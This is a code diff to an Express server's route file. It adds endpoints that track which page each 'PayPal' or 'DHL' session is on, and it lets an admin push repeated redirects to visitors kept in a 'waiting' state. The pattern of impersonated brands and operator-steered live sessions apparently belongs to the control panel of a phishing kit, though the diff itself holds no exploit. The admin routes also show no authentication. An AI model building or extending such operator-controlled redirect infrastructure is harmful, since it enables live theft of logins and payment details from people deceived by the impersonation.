@@ -288,6 +288,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Update current path for PayPal session (client)
+  app.patch("/api/paypal/session/:sessionId/path", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const { currentPath } = req.body;
+
+      const updated = await storage.updatePaypalSession(sessionId, {
+        currentPath,
+      });
+
+      if (!updated) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to update path" });
+    }
+  });
+
   // Get all waiting PayPal sessions (admin)
   app.get("/api/admin/paypal-sessions", async (req, res) => {
     try {
@@ -315,6 +335,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Update current path for DHL session (client)
+  app.patch("/api/dhl/session/:sessionId/path", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const { currentPath } = req.body;
+
+      const updated = await storage.updateDhlSession(sessionId, {
+        currentPath,
+      });
+
+      if (!updated) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to update path" });
+    }
+  });
+
   app.get("/api/admin/dhl-sessions", async (req, res) => {
     try {
       const sessions = await storage.getAllDhlSessions();
@@ -330,9 +370,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const { sessionId } = req.params;
       const { redirectUrl } = req.body;
 
+      // Get current session to increment version
+      const currentSession = await storage.getDhlSession(sessionId);
+      if (!currentSession) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      // Increment redirectVersion and update redirectUrl, keep status as waiting
       const updated = await storage.updateDhlSession(sessionId, {
         redirectUrl,
-        status: "redirected",
+        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
+        status: "waiting", // Keep as waiting to allow multiple redirects
       });
 
       if (!updated) {
@@ -351,16 +399,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const { sessionId } = req.params;
       const { redirectUrl } = req.body;
 
+      // Get current session to increment version
+      const currentSession = await storage.getPaypalSession(sessionId);
+      if (!currentSession) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      // Increment redirectVersion and update redirectUrl, keep status as waiting
       const updated = await storage.updatePaypalSession(sessionId, {
         redirectUrl,
-        status: "redirected",
+        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
+        status: "waiting", // Keep as waiting to allow multiple redirects
       });
 
       if (!updated) {
         return res.status(404).json({ error: "Session not found" });
       }
 
-      res.json({ success: true });
+      res.json(updated);
     } catch (error) {
       res.status(500).json({ error: "Failed to update session" });
     }
